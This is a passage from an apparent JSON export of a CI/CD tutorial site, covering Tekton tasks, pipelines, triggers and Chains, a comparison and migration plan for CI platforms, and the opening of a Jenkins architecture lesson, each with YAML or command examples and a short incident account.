--context=$(workspaces.source.path)\n        - --destination=$(params.image)\n        - --digest-file=$(results.digest.path)\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">apiVersion:\u003c/span> \u003cspan class=\"hljs-string\">tekton.dev/v1\u003c/span>\n\u003cspan class=\"hljs-attr\">kind:\u003c/span> \u003cspan class=\"hljs-string\">Task\u003c/span>\n\u003cspan class=\"hljs-attr\">metadata:\u003c/span>\n  \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">build-image\u003c/span>\n\u003cspan class=\"hljs-attr\">spec:\u003c/span>\n  \u003cspan class=\"hljs-attr\">params:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">image\u003c/span>\n      \u003cspan class=\"hljs-attr\">type:\u003c/span> \u003cspan class=\"hljs-string\">string\u003c/span>\n  \u003cspan class=\"hljs-attr\">workspaces:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">source\u003c/span>\n  \u003cspan class=\"hljs-attr\">results:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">digest\u003c/span>\n  \u003cspan class=\"hljs-attr\">steps:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">build\u003c/span>\n      \u003cspan class=\"hljs-attr\">image:\u003c/span> \u003cspan class=\"hljs-string\">gcr.io/kaniko-project/executor:latest\u003c/span>\n      \u003cspan class=\"hljs-attr\">args:\u003c/span>\n        \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">--context=$(workspaces.source.path)\u003c/span>\n        \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">--destination=$(params.image)\u003c/span>\n        \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-string\">--digest-file=$(results.digest.path)\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>A \u003cstrong>Task\u003c/strong> runs as one pod, and each \u003cstrong>step\u003c/strong> is a container in it. Steps share the pod&#39;s files and run in order. Params are inputs, results are small outputs and a \u003cstrong>workspace\u003c/strong> is a mounted directory for larger data.\u003c/p>\n\u003ch2 id=\"pipeline\">Pipeline\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"apiVersion: tekton.dev/v1\nkind: Pipeline\nmetadata:\n  name: ci\nspec:\n  params:\n    - name: image\n  workspaces:\n    - name: shared\n  tasks:\n    - name: build\n      taskRef:\n        name: build-image\n      params:\n        - name: image\n          value: $(params.image)\n      workspaces:\n        - name: source\n          workspace: shared\n    - name: scan\n      runAfter: [build]\n      taskRef:\n        name: scan-image\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">apiVersion:\u003c/span> \u003cspan class=\"hljs-string\">tekton.dev/v1\u003c/span>\n\u003cspan class=\"hljs-attr\">kind:\u003c/span> \u003cspan class=\"hljs-string\">Pipeline\u003c/span>\n\u003cspan class=\"hljs-attr\">metadata:\u003c/span>\n  \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">ci\u003c/span>\n\u003cspan class=\"hljs-attr\">spec:\u003c/span>\n  \u003cspan class=\"hljs-attr\">params:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">image\u003c/span>\n  \u003cspan class=\"hljs-attr\">workspaces:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">shared\u003c/span>\n  \u003cspan class=\"hljs-attr\">tasks:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">build\u003c/span>\n      \u003cspan class=\"hljs-attr\">taskRef:\u003c/span>\n        \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">build-image\u003c/span>\n      \u003cspan class=\"hljs-attr\">params:\u003c/span>\n        \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">image\u003c/span>\n          \u003cspan class=\"hljs-attr\">value:\u003c/span> \u003cspan class=\"hljs-string\">$(params.image)\u003c/span>\n      \u003cspan class=\"hljs-attr\">workspaces:\u003c/span>\n        \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">source\u003c/span>\n          \u003cspan class=\"hljs-attr\">workspace:\u003c/span> \u003cspan class=\"hljs-string\">shared\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">scan\u003c/span>\n      \u003cspan class=\"hljs-attr\">runAfter:\u003c/span> [\u003cspan class=\"hljs-string\">build\u003c/span>]\n      \u003cspan class=\"hljs-attr\">taskRef:\u003c/span>\n        \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">scan-image\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>A \u003cstrong>Pipeline\u003c/strong> lists tasks and orders them with \u003ccode>runAfter\u003c/code> or by using another task&#39;s result. Tasks run as separate pods, possibly on different nodes, so data between them must travel through a workspace or a result.\u003c/p>\n\u003ch2 id=\"running\">Running\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"bash\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"tkn pipeline start ci --param image=registry.example.com/app:1.4 \\\n  --workspace name=shared,claimName=ci-cache --showlog\nkubectl get pipelineruns,taskruns\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">tkn pipeline start ci --param image=registry.example.com/app:1.4 \\\n  --workspace name=shared,claimName=ci-cache --showlog\nkubectl get pipelineruns,taskruns\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>A \u003cstrong>PipelineRun\u003c/strong> supplies real params and volumes and creates one TaskRun per task. Inspect logs with \u003ccode>tkn pipelinerun logs\u003c/code>, and use \u003ccode>kubectl describe\u003c/code> to see scheduling and volume problems.\u003c/p>\n\u003ch2 id=\"incident-the-task-that-could-not-see-the-source\">Incident: The task that could not see the source\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A second task found an empty directory because tasks run in separate pods.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln out\">scan-image: no such file or directory: /workspace/src\u003c/span>\u003cspan class=\"ln out\">build-image: success\u003c/span>\u003cspan class=\"ln out\">scan-image: failed\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The author assumed that all tasks shared one disk. Each task ran in its own pod. The pipeline was changed to bind one persistent volume claim as a shared workspace, and the build task now writes the image digest to a result so the scan task does not depend on local files at all.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Assuming tasks share a filesystem\u003c/li>\n\u003cli>Using large results instead of workspaces\u003c/li>\n\u003cli>Unpinned step images\u003c/li>\n\u003cli>Leaving finished runs in the cluster forever\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"task","text":"Task"},{"id":"pipeline","text":"Pipeline"},{"id":"running","text":"Running"},{"id":"incident-the-task-that-could-not-see-the-source","text":"Incident: The task that could not see the source"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Tekton Pipelines","u":"https://tekton.dev/docs/pipelines/"},{"t":"Tasks and Pipelines","u":"https://tekton.dev/docs/pipelines/tasks/"}],"text":"Tekton is a Kubernetes-native CI and delivery framework. Everything is a custom resource, so pipelines are applied with kubectl, scheduled as pods and observable with the same tools as any other workload. What you will learn Writing a Task with steps and params Linking tasks into a Pipeline Sharing data with workspaces and results Running with TaskRun and PipelineRun Task apiVersion: tekton.dev/v1 kind: Task metadata: name: build-image spec: params: - name: image type: string workspaces: - name: source results: - name: digest steps: - name: build image: gcr.io/kaniko-project/executor:latest args: - --context=$(workspaces.source.path) - --destination=$(params.image) - --digest-file=$(results.digest.path) A Task runs as one pod, and each step is a container in it. Steps share the pod&#39;s files and run in order. Params are inputs, results are small outputs and a workspace is a mounted directory for larger data. Pipeline apiVersion: tekton.dev/v1 kind: Pipeline metadata: name: ci spec: params: - name: image workspaces: - name: shared tasks: - name: build taskRef: name: build-image params: - name: image value: $(params.image) workspaces: - name: source workspace: shared - name: scan runAfter: [ build ] taskRef: name: scan-image A Pipeline lists tasks and orders them with runAfter or by using another task&#39;s result. Tasks run as separate pods, possibly on different nodes, so data between them must travel through a workspace or a result. Running tkn pipeline start ci --param image=registry.example.com/app:1.4 \\ --workspace name=shared,claimName=ci-cache --showlog kubectl get pipelineruns,taskruns A PipelineRun supplies real params and volumes and creates one TaskRun per task. Inspect logs with tkn pipelinerun logs , and use kubectl describe to see scheduling and volume problems. Incident: The task that could not see the source Incident A second task found an empty directory because tasks run in separate pods. scan-image: no such file or directory: /workspace/src build-image: success scan-image: failed The author assumed that all tasks shared one disk. Each task ran in its own pod. The pipeline was changed to bind one persistent volume claim as a shared workspace, and the build task now writes the image digest to a result so the scan task does not depend on local files at all. Common mistakes Assuming tasks share a filesystem Using large results instead of workspaces Unpinned step images Leaving finished runs in the cluster forever"},"cicd/tekton-triggers-chains-and-production-use":{"html":"\u003cp>A Pipeline definition does nothing until something creates a run. Tekton Triggers connects events to runs, Chains adds signatures and provenance, and a few production practices keep a CI system that lives inside your cluster from harming it.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>How Triggers turns a webhook into a PipelineRun\u003c/li>\n\u003cli>What Chains signs and attests\u003c/li>\n\u003cli>RBAC, namespaces and quotas for CI\u003c/li>\n\u003cli>Pruning, metrics and upgrades\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"triggers\">Triggers\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"yaml\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"apiVersion: triggers.tekton.dev/v1beta1\nkind: TriggerBinding\nmetadata:\n  name: push-binding\nspec:\n  params:\n    - name: revision\n      value: $(body.after)\n    - name: repo\n      value: $(body.repository.clone_url)\n---\napiVersion: triggers.tekton.dev/v1beta1\nkind: TriggerTemplate\nmetadata:\n  name: ci-template\nspec:\n  params:\n    - name: revision\n    - name: repo\n  resourcetemplates:\n    - apiVersion: tekton.dev/v1\n      kind: PipelineRun\n      metadata:\n        generateName: ci-run-\n      spec:\n        pipelineRef:\n          name: ci\n        params:\n          - name: revision\n            value: $(tt.params.revision)\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-attr\">apiVersion:\u003c/span> \u003cspan class=\"hljs-string\">triggers.tekton.dev/v1beta1\u003c/span>\n\u003cspan class=\"hljs-attr\">kind:\u003c/span> \u003cspan class=\"hljs-string\">TriggerBinding\u003c/span>\n\u003cspan class=\"hljs-attr\">metadata:\u003c/span>\n  \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">push-binding\u003c/span>\n\u003cspan class=\"hljs-attr\">spec:\u003c/span>\n  \u003cspan class=\"hljs-attr\">params:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">revision\u003c/span>\n      \u003cspan class=\"hljs-attr\">value:\u003c/span> \u003cspan class=\"hljs-string\">$(body.after)\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">repo\u003c/span>\n      \u003cspan class=\"hljs-attr\">value:\u003c/span> \u003cspan class=\"hljs-string\">$(body.repository.clone_url)\u003c/span>\n\u003cspan class=\"hljs-meta\">---\u003c/span>\n\u003cspan class=\"hljs-attr\">apiVersion:\u003c/span> \u003cspan class=\"hljs-string\">triggers.tekton.dev/v1beta1\u003c/span>\n\u003cspan class=\"hljs-attr\">kind:\u003c/span> \u003cspan class=\"hljs-string\">TriggerTemplate\u003c/span>\n\u003cspan class=\"hljs-attr\">metadata:\u003c/span>\n  \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">ci-template\u003c/span>\n\u003cspan class=\"hljs-attr\">spec:\u003c/span>\n  \u003cspan class=\"hljs-attr\">params:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">revision\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">repo\u003c/span>\n  \u003cspan class=\"hljs-attr\">resourcetemplates:\u003c/span>\n    \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">apiVersion:\u003c/span> \u003cspan class=\"hljs-string\">tekton.dev/v1\u003c/span>\n      \u003cspan class=\"hljs-attr\">kind:\u003c/span> \u003cspan class=\"hljs-string\">PipelineRun\u003c/span>\n      \u003cspan class=\"hljs-attr\">metadata:\u003c/span>\n        \u003cspan class=\"hljs-attr\">generateName:\u003c/span> \u003cspan class=\"hljs-string\">ci-run-\u003c/span>\n      \u003cspan class=\"hljs-attr\">spec:\u003c/span>\n        \u003cspan class=\"hljs-attr\">pipelineRef:\u003c/span>\n          \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">ci\u003c/span>\n        \u003cspan class=\"hljs-attr\">params:\u003c/span>\n          \u003cspan class=\"hljs-bullet\">-\u003c/span> \u003cspan class=\"hljs-attr\">name:\u003c/span> \u003cspan class=\"hljs-string\">revision\u003c/span>\n            \u003cspan class=\"hljs-attr\">value:\u003c/span> \u003cspan class=\"hljs-string\">$(tt.params.revision)\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>An \u003cstrong>EventListener\u003c/strong> is a service that receives webhooks. A \u003cstrong>TriggerBinding\u003c/strong> picks fields from the payload, and a \u003cstrong>TriggerTemplate\u003c/strong> creates the resources. Add an interceptor to verify the webhook secret and filter events, so only valid, wanted pushes start builds.\u003c/p>\n\u003ch2 id=\"chains\">Chains\u003c/h2>\n\u003cp>\u003cstrong>Tekton Chains\u003c/strong> watches completed TaskRuns, signs images and results and stores \u003cstrong>provenance\u003c/strong> that records what built what. It uses keys from a KMS or keyless signing and gives you evidence that an image came from your pipeline, which later admission policies can verify.\u003c/p>\n\u003ch2 id=\"production-practices\">Production practices\u003c/h2>\n\u003cul>\n\u003cli>Run each team&#39;s pipelines in its own namespace with a dedicated service account and the least RBAC it needs.\u003c/li>\n\u003cli>Set resource requests, limits and a ResourceQuota so a build cannot starve the cluster.\u003c/li>\n\u003cli>Pin step images by digest and use trusted bundles or a catalog with review.\u003c/li>\n\u003cli>Prune finished runs on a schedule, and export controller metrics to your monitoring.\u003c/li>\n\u003cli>Upgrade the controllers on a plan, because custom resources and APIs evolve.\u003c/li>\n\u003c/ul>\n\u003cdiv class=\"code\" data-lang=\"bash\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"kubectl get pipelineruns -n ci --sort-by=.metadata.creationTimestamp | tail\ntkn pipelinerun delete --keep 50 -n ci -f\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">kubectl get pipelineruns -n ci --sort-by=.metadata.creationTimestamp | \u003cspan class=\"hljs-built_in\">tail\u003c/span>\ntkn pipelinerun delete --keep 50 -n ci -f\u003c/code>\u003c/pre>\u003c/div>\n\u003ch2 id=\"incident-ten-thousand-finished-runs\">Incident: Ten thousand finished runs\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>Old runs piled up in the cluster and slowed the API server.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"kubectl get taskruns -A | wc -l\" aria-label=\"Copy commands\">Copy commands\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln cmd\">\u003cspan class=\"ps\" aria-hidden=\"true\">$ \u003c/span>kubectl get taskruns -A | \u003cspan class=\"hljs-built_in\">wc\u003c/span> -l\u003c/span>\u003cspan class=\"ln out\">10482\u003c/span>\u003cspan class=\"ln out\">apiserver: etcd request took 2.1s\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>Nobody had set a retention policy, so every run stayed as objects in the cluster. Listing them was slow and the control plane suffered. The team enabled automatic pruning, shipped logs and results to external storage and added a quota on the CI namespace.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>No pruning of old runs\u003c/li>\n\u003cli>One shared service account with broad rights\u003c/li>\n\u003cli>Webhook endpoints with no secret validation\u003c/li>\n\u003cli>Mutable step images such as latest\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"triggers","text":"Triggers"},{"id":"chains","text":"Chains"},{"id":"production-practices","text":"Production practices"},{"id":"incident-ten-thousand-finished-runs","text":"Incident: Ten thousand finished runs"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"Tekton Triggers","u":"https://tekton.dev/docs/triggers/"},{"t":"Tekton Chains","u":"https://tekton.dev/docs/chains/"}],"text":"A Pipeline definition does nothing until something creates a run. Tekton Triggers connects events to runs, Chains adds signatures and provenance, and a few production practices keep a CI system that lives inside your cluster from harming it. What you will learn How Triggers turns a webhook into a PipelineRun What Chains signs and attests RBAC, namespaces and quotas for CI Pruning, metrics and upgrades Triggers apiVersion: triggers.tekton.dev/v1beta1 kind: TriggerBinding metadata: name: push-binding spec: params: - name: revision value: $(body.after) - name: repo value: $(body.repository.clone_url) --- apiVersion: triggers.tekton.dev/v1beta1 kind: TriggerTemplate metadata: name: ci-template spec: params: - name: revision - name: repo resourcetemplates: - apiVersion: tekton.dev/v1 kind: PipelineRun metadata: generateName: ci-run- spec: pipelineRef: name: ci params: - name: revision value: $(tt.params.revision) An EventListener is a service that receives webhooks. A TriggerBinding picks fields from the payload, and a TriggerTemplate creates the resources. Add an interceptor to verify the webhook secret and filter events, so only valid, wanted pushes start builds. Chains Tekton Chains watches completed TaskRuns, signs images and results and stores provenance that records what built what. It uses keys from a KMS or keyless signing and gives you evidence that an image came from your pipeline, which later admission policies can verify. Production practices Run each team&#39;s pipelines in its own namespace with a dedicated service account and the least RBAC it needs. Set resource requests, limits and a ResourceQuota so a build cannot starve the cluster. Pin step images by digest and use trusted bundles or a catalog with review. Prune finished runs on a schedule, and export controller metrics to your monitoring. Upgrade the controllers on a plan, because custom resources and APIs evolve. kubectl get pipelineruns -n ci --sort-by=.metadata.creationTimestamp | tail tkn pipelinerun delete --keep 50 -n ci -f Incident: Ten thousand finished runs Incident Old runs piled up in the cluster and slowed the API server. $ kubectl get taskruns -A | wc -l 10482 apiserver: etcd request took 2.1s Nobody had set a retention policy, so every run stayed as objects in the cluster. Listing them was slow and the control plane suffered. The team enabled automatic pruning, shipped logs and results to external storage and added a quota on the CI namespace. Common mistakes No pruning of old runs One shared service account with broad rights Webhook endpoints with no secret validation Mutable step images such as latest"},"cicd/choosing-and-migrating-between-ci-platforms":{"html":"\u003cp>Choosing a CI platform is a long-term decision, and moving later costs real time. A clear comparison and a careful migration plan avoid both the wrong choice and a stalled migration.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>A comparison table you can reuse\u003c/li>\n\u003cli>Questions that decide the choice\u003c/li>\n\u003cli>A migration plan that limits risk\u003c/li>\n\u003cli>Measuring whether the move helped\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"comparison\">Comparison\u003c/h2>\n\u003cdiv class=\"table-wrap\" tabindex=\"0\" role=\"region\" aria-label=\"Table\">\u003ctable>\u003cthead>\u003ctr>\n\u003cth>Area\u003c/th>\n\u003cth>GitHub Actions\u003c/th>\n\u003cth>GitLab CI\u003c/th>\n\u003cth>Tekton\u003c/th>\n\u003c/tr>\n\u003c/thead>\u003ctbody>\u003ctr>\n\u003ctd>Where it runs\u003c/td>\n\u003ctd>Hosted by the code platform, or your runners\u003c/td>\n\u003ctd>Hosted or self-managed, or your runners\u003c/td>\n\u003ctd>Your Kubernetes clusters\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Config\u003c/td>\n\u003ctd>YAML in the repository\u003c/td>\n\u003ctd>YAML in the repository\u003c/td>\n\u003ctd>Kubernetes custom resources\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Reuse\u003c/td>\n\u003ctd>Marketplace, reusable workflows\u003c/td>\n\u003ctd>Includes, templates\u003c/td>\n\u003ctd>Tasks, bundles, catalogs\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Strength\u003c/td>\n\u003ctd>Ecosystem and ease\u003c/td>\n\u003ctd>Integrated platform and DAG\u003c/td>\n\u003ctd>Control and cloud-native fit\u003c/td>\n\u003c/tr>\n\u003ctr>\n\u003ctd>Cost to run\u003c/td>\n\u003ctd>Minutes plus runner effort\u003c/td>\n\u003ctd>License plus runner effort\u003c/td>\n\u003ctd>Cluster and platform team effort\u003c/td>\n\u003c/tr>\n\u003c/tbody>\u003c/table>\u003c/div>\n\u003cp>Tekton is rarely a developer&#39;s first choice on its own. It fits when a platform team builds a delivery product on Kubernetes.\u003c/p>\n\u003ch2 id=\"questions-that-decide\">Questions that decide\u003c/h2>\n\u003cul>\n\u003cli>Where do code and reviews live now? Staying close removes integration work.\u003c/li>\n\u003cli>Who must own and patch the workers, and is that acceptable?\u003c/li>\n\u003cli>Do builds need private networks, special hardware or air-gapped clusters?\u003c/li>\n\u003cli>What audit, approval and policy evidence does your industry require?\u003c/li>\n\u003cli>What does the bill look like at your build volume?\u003c/li>\n\u003cli>What skills does the team already have?\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"migration-plan\">Migration plan\u003c/h2>\n\u003cdiv class=\"code\" data-lang=\"bash\">\u003cbutton class=\"copy\" type=\"button\" data-copy=\"# inventory: list pipelines and what they use\ngrep -rl &quot;docker build&quot; --include=&quot;*.yml&quot; . | wc -l\n# move logic into scripts any platform can call\n./ci/build.sh &amp;&amp; ./ci/test.sh &amp;&amp; ./ci/package.sh\" aria-label=\"Copy code\">Copy\u003c/button>\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"hljs-comment\"># inventory: list pipelines and what they use\u003c/span>\ngrep -rl \u003cspan class=\"hljs-string\">&quot;docker build&quot;\u003c/span> --include=\u003cspan class=\"hljs-string\">&quot;*.yml&quot;\u003c/span> . | \u003cspan class=\"hljs-built_in\">wc\u003c/span> -l\n\u003cspan class=\"hljs-comment\"># move logic into scripts any platform can call\u003c/span>\n./ci/build.sh &amp;&amp; ./ci/test.sh &amp;&amp; ./ci/package.sh\u003c/code>\u003c/pre>\u003c/div>\n\u003col>\n\u003cli>\u003cstrong>Inventory\u003c/strong> pipelines, secrets, runners, schedules and integrations.\u003c/li>\n\u003cli>\u003cstrong>Extract\u003c/strong> build logic into scripts so the platform file becomes thin.\u003c/li>\n\u003cli>\u003cstrong>Pilot\u003c/strong> with one low-risk service and write down what surprised you.\u003c/li>\n\u003cli>\u003cstrong>Run in parallel\u003c/strong> and compare duration, results and cost.\u003c/li>\n\u003cli>\u003cstrong>Cut over\u003c/strong> in waves with a rollback date, then archive the old pipeline.\u003c/li>\n\u003c/ol>\n\u003ch2 id=\"measure\">Measure\u003c/h2>\n\u003cp>Track lead time, failure rate, queue time and cost before and after. If the numbers do not improve, find out why before moving the next wave.\u003c/p>\n\u003ch2 id=\"incident-ten-months-for-a-three-month-plan\">Incident: Ten months for a three month plan\u003c/h2>\n\u003caside class=\"callout callout-incident\">\u003cdiv class=\"callout-title\">Incident\u003c/div>\u003cp>A migration dragged on because every pipeline had hidden dependencies.\u003c/p>\n\u003c/aside>\n\u003cdiv class=\"code console\" data-lang=\"terminal\">\u003cpre tabindex=\"0\">\u003ccode class=\"hljs\">\u003cspan class=\"ln out\">inventory: 214 pipelines\u003c/span>\u003cspan class=\"ln out\">undocumented secrets found: 61\u003c/span>\u003cspan class=\"ln out\">pipelines calling internal scripts by path: 87\u003c/span>\u003c/code>\u003c/pre>\u003c/div>\n\u003cp>The plan treated each pipeline as a copy job. Discovery showed secrets nobody had documented and scripts called by absolute path. The team paused, built the shared scripts layer, ran a pilot, documented the surprises and then moved in waves, finishing predictably.\u003c/p>\n\u003ch2 id=\"common-mistakes\">Common mistakes\u003c/h2>\n\u003cul>\n\u003cli>Choosing by trend instead of requirements\u003c/li>\n\u003cli>Migrating everything at once\u003c/li>\n\u003cli>Leaving logic in platform-specific YAML\u003c/li>\n\u003cli>No success metrics for the move\u003c/li>\n\u003c/ul>\n","toc":[{"id":"what-you-will-learn","text":"What you will learn"},{"id":"comparison","text":"Comparison"},{"id":"questions-that-decide","text":"Questions that decide"},{"id":"migration-plan","text":"Migration plan"},{"id":"measure","text":"Measure"},{"id":"incident-ten-months-for-a-three-month-plan","text":"Incident: Ten months for a three month plan"},{"id":"common-mistakes","text":"Common mistakes"}],"refs":[{"t":"GitHub Actions documentation","u":"https://docs.github.com/en/actions"},{"t":"Tekton documentation","u":"https://tekton.dev/docs/"},{"t":"GitLab CI/CD documentation","u":"https://docs.gitlab.com/ee/ci/"}],"text":"Choosing a CI platform is a long-term decision, and moving later costs real time. A clear comparison and a careful migration plan avoid both the wrong choice and a stalled migration. What you will learn A comparison table you can reuse Questions that decide the choice A migration plan that limits risk Measuring whether the move helped Comparison Area GitHub Actions GitLab CI Tekton Where it runs Hosted by the code platform, or your runners Hosted or self-managed, or your runners Your Kubernetes clusters Config YAML in the repository YAML in the repository Kubernetes custom resources Reuse Marketplace, reusable workflows Includes, templates Tasks, bundles, catalogs Strength Ecosystem and ease Integrated platform and DAG Control and cloud-native fit Cost to run Minutes plus runner effort License plus runner effort Cluster and platform team effort Tekton is rarely a developer&#39;s first choice on its own. It fits when a platform team builds a delivery product on Kubernetes. Questions that decide Where do code and reviews live now? Staying close removes integration work. Who must own and patch the workers, and is that acceptable? Do builds need private networks, special hardware or air-gapped clusters? What audit, approval and policy evidence does your industry require? What does the bill look like at your build volume? What skills does the team already have? Migration plan # inventory: list pipelines and what they use grep -rl \"docker build\" --include= \"*.yml\" . | wc -l # move logic into scripts any platform can call ./ci/build.sh && ./ci/test.sh && ./ci/package.sh Inventory pipelines, secrets, runners, schedules and integrations. Extract build logic into scripts so the platform file becomes thin. Pilot with one low-risk service and write down what surprised you. Run in parallel and compare duration, results and cost. Cut over in waves with a rollback date, then archive the old pipeline. Measure Track lead time, failure rate, queue time and cost before and after. If the numbers do not improve, find out why before moving the next wave. Incident: Ten months for a three month plan Incident A migration dragged on because every pipeline had hidden dependencies. inventory: 214 pipelines undocumented secrets found: 61 pipelines calling internal scripts by path: 87 The plan treated each pipeline as a copy job. Discovery showed secrets nobody had documented and scripts called by absolute path. The team paused, built the shared scripts layer, ran a pilot, documented the surprises and then moved in waves, finishing predictably. Common mistakes Choosing by trend instead of requirements Migrating everything at once Leaving logic in platform-specific YAML No success metrics for the move"},"cicd/jenkins-architecture-controllers-agents-and-jobs":{"html":"\u003cp>Jenkins is the long-lived, self-hosted CI server that many companies still run. Before writing a pipeline it helps to know the moving parts, because most Jenkins problems are really problems with the controller, an agent or the disk they share.\u003c/p>\n\u003ch2 id=\"what-you-will-learn\">What you will learn\u003c/h2>\n\u003cul>\n\u003cli>What the controller and agents each do\u003c/li>\n\u003cli>The difference between a job, a build, a node and an executor\u003c/li>\n\u003cli>Where Jenkins keeps its configuration and history\u003c/li>\n\u003cli>Why builds should not run on the controller\u003c/li>\n\u003c/ul>\n\u003ch2 id=\"the-two-roles\">The two roles\u003c/h2>\n\u003cp>The \u003cstrong>controller\u003c/strong> (older docs say master) serves the web interface, stores configuration, holds the build queue, keeps credentials and decides where each build runs. An \u003cstrong>agent\u003c/strong> is any machine or container that connects to the controller and runs build steps. Each agent offers a number of \u003cstrong>executors\u003c/strong>, and each executor runs one build at a time.\u003c/p>\n\u003cfigure class=\"dg\" data-rows=\"2\" data-edges=\"trigger&gt;controller;controller&gt;agent;agent&gt;result;controller&gt;home\" style=\"--rows:2\">\u003cfigcaption class=\"dg-title\">How a Jenkins build is scheduled\u003c/figcaption>\u003cdiv class=\"dg-stage\">\u003csvg viewBox=\"0 0 100 100\" preserveAspectRatio=\"none\" aria-hidden=\"true\" focusable=\"false\">\u003cline x1=\"16.7\" y1=\"25.0\" x2=\"50.0\" y2=\"25.0\"/>\u003cline 